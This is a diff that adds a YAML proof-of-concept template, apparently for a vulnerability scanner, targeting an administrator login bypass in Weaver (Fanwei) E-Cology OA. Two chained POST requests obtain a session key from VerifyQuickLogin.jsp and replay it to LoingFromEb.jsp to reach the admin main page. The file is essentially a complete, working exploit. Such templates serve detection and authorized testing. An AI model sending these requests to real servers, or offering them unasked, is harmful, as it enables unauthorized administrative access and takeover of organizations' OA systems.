@@ -1,0 +1,35 @@
+name: poc-yaml-weaver-oa-ultra-vires
+binding: 6b3f0c33-b77f-4355-a8a9-99c715381827
+manual: true
+detail:
+    author: xiaobaicai
+    links:
+        - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20VerifyQuickLogin.jsp%20%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.md
+    vulnerability:
+        id: CT-483454
+        level: high
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /mobile/plugin/VerifyQuickLogin.jsp
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: identifier=1&language=1&ipaddress=x.x.x.x
+        expression: response.status == 200 && response.body.bcontains(b"{\"sessionkey\":\"") && response.body.bcontains(b"\"message\":\"1\"}")
+        output:
+            search: '''sessionkey":(?P<id1>.+?)"''.bsubmatch(response.body)'
+            id1: search["id1"]
+            id: replaceAll(string(id1), '"', "")
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /mobile/plugin/plus/login/LoingFromEb.jsp
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: loginkey={{id}}
+        expression: response.status == 200 && response.body.bcontains(b"window.location.href=\"/login/RemindLogin.jsp?RedirectFile=/wui/main.jsp\";")
+expression: r0() && r1()
